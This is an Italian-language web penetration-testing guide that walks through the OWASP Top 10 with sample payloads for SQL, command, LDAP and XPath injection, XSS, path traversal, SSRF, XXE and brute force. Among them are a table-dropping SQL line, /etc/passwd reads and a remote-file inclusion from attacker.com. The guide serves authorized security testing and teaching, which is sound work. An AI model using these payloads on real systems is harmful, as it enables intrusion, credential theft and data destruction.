# Web Vulnerabilities Overview

## Scopo

Questa guida fornisce una panoramica delle principali vulnerabilità web, metodologie di testing e riferimenti per approfondire ogni categoria.

## Prerequisiti

- Conoscenza HTTP/HTTPS
- HTML, JavaScript, SQL base
- Burp Suite
- **Autorizzazione per testing**

---

## OWASP Top 10 (2021)

| # | Categoria | Descrizione |
|---|-----------|-------------|
| A01 | Broken Access Control | Violazioni autorizzazione |
| A02 | Cryptographic Failures | Crittografia debole/assente |
| A03 | Injection | SQLi, Command Injection, etc. |
| A04 | Insecure Design | Problemi architetturali |
| A05 | Security Misconfiguration | Configurazioni errate |
| A06 | Vulnerable Components | Librerie con CVE note |
| A07 | Auth/Session Failures | Problemi autenticazione |
| A08 | Data Integrity Failures | Dati non verificati |
| A09 | Logging/Monitoring Failures | Log insufficienti |
| A10 | SSRF | Server-Side Request Forgery |

---

## Metodologia Testing

### Information Gathering

```bash
# Tecnologie
whatweb https://target.com
wappalyzer (browser extension)

# Subdomain
subfinder -d target.com
amass enum -d target.com

# Directory
gobuster dir -u https://target.com -w wordlist.txt
```

### Mapping

```
1. Spider/crawl applicazione
2. Identifica funzionalità
3. Mappa endpoint API
4. Identifica form/input
5. Analizza authentication flow
```

### Vulnerability Testing

```
Per ogni input:
- Injection testing
- XSS testing
- Authorization testing
- Business logic testing
```

---

## Injection Vulnerabilities

### SQL Injection

```sql
' OR '1'='1
' UNION SELECT username,password FROM users--
'; DROP TABLE users--
```

**Guida dettagliata**: [sql-injection.md](sql-injection.md)

### Command Injection

```bash
; ls -la
| cat /etc/passwd
$(whoami)
`id`
```

**Guida dettagliata**: [command-injection.md](command-injection.md)

### LDAP Injection

```
*)(uid=*))(|(uid=*
admin)(&)
*)(&
admin)(|(password=*)

# Bypass autenticazione
user=*)(&password=*
# Query diventa: (&(user=*)(&password=*)(password=input))
```

### XPath Injection

```
' or '1'='1
' or ''='
```

---

## Client-Side Vulnerabilities

### XSS (Cross-Site Scripting)

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Guida dettagliata**: [xss-csrf.md](xss-csrf.md)

### DOM-Based Attacks

```javascript
// Sinks pericolosi
innerHTML
document.write()
eval()
```

### Open Redirect

```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com
```

### Clickjacking

```html
<!-- Attacker page -->
<iframe src="https://target.com/sensitive-action" style="opacity:0;position:absolute;"></iframe>
<button style="position:relative;">Click me!</button>

<!-- Test: se X-Frame-Options manca, vulnerabile -->
```

### Cookie Manipulation

```
# Modifica cookie per privilege escalation
Cookie: role=admin; user_id=1

# Cookie senza flag Secure/HttpOnly
# Accessibile via JavaScript o sniffing
```

### Parameter Pollution (HPP)

```
# HTTP Parameter Pollution
GET /transfer?amount=100&amount=10000
# Backend potrebbe usare secondo valore

# Tool: OWASP ZAP per detection
```

### Hidden Elements

```html
<!-- Elementi nascosti nel DOM -->
<input type="hidden" name="admin" value="false">
<!-- Modifica in true via DevTools -->

<!-- Comments nel source code -->
<!-- TODO: remove debug password: admin123 -->
```

---

## Authentication Vulnerabilities

### Brute Force

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid"
```

### Session Management

```
- Session fixation
- Predictable session ID
- Missing HttpOnly/Secure flags
- Session not invalidated on logout
```

**Guida dettagliata**: [session-hijacking.md](session-hijacking.md)

### Password Reset

```
- Token reuse
- Weak token
- Token in URL (logged)
- No rate limiting
```

---

## Authorization Vulnerabilities

### IDOR

```
GET /api/users/1001/profile  # Tuo profilo
GET /api/users/1002/profile  # Profilo altri (IDOR)
```

### Privilege Escalation

```
- Horizontal: accesso dati altri utenti
- Vertical: accesso funzioni admin
```

### Forced Browsing

```
/admin/
/backup/
/config/
/.git/
```

---

## File Handling Vulnerabilities

### Path Traversal

```
../../../etc/passwd
....//....//....//etc/passwd
```

**Guida dettagliata**: [path-traversal.md](path-traversal.md)

### File Upload

```
- Bypass extension (file.php.jpg)
- Content-Type manipulation
- Magic bytes
- Polyglot files
```

### LFI/RFI

```
php://filter/convert.base64-encode/resource=config.php
http://attacker.com/shell.txt
```

**Guida dettagliata**: [lfi-rfi.md](lfi-rfi.md)

---

## Logic Vulnerabilities

### Business Logic Flaws

```
- Price manipulation
- Quantity tampering
- Discount code abuse
- Race conditions
```

### Race Conditions

```python
# Esempio: doppio prelievo
import threading

def withdraw():
    requests.post(url, data={"amount": 1000})

threads = [threading.Thread(target=withdraw) for _ in range(10)]
for t in threads: t.start()

# Tool: Turbo Intruder in Burp Suite
```

### Lack of Code Signing

```
# Applicazioni senza firma digitale
# Verificare:
- Binaries non firmati
- Scripts non verificati
- Updates senza signature check
- Mobile apps con certificate self-signed
```

---

## Server-Side Vulnerabilities

### SSRF

```
http://169.254.169.254/latest/meta-data/
http://localhost:8080/admin
file:///etc/passwd
```

### XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Deserialization

```
- Java: ysoserial
- PHP: phpggc
- .NET: ysoserial.net
- Python: pickle exploitation
```

---

## Headers Security

### Missing Headers

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
```

### Test

```bash
curl -I https://target.com | grep -E "X-Frame|X-Content|Strict|CSP"
```

---

## Tools Essenziali

| Tool | Uso |
|------|-----|
| Burp Suite | Proxy, scanner |
| OWASP ZAP | Open source alternative |
| SQLMap | SQL injection automation |
| Nikto | Web server scanner |
| WPScan | WordPress scanner |
| Nuclei | Vulnerability scanner |

---

## Reporting

### Struttura

```markdown
## Vulnerability: SQL Injection

### Description
SQL injection in login form parameter 'username'

### Steps to Reproduce
1. Navigate to /login
2. Enter payload: ' OR '1'='1'--
3. Submit form

### Impact
Full database access, authentication bypass

### CVSS Score
9.8 (Critical)

### Remediation
Use parameterized queries
```

---

## Best Practices

- **Scope**: Rispetta boundaries autorizzati
- **Non-destructive**: Evita danni a dati/sistemi
- **Documentation**: Log ogni test eseguito
- **Escalation**: Segnala critical immediatamente
- **Verification**: Conferma remediation

## Riferimenti

- [OWASP Top 10](https://owasp.org/Top10/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
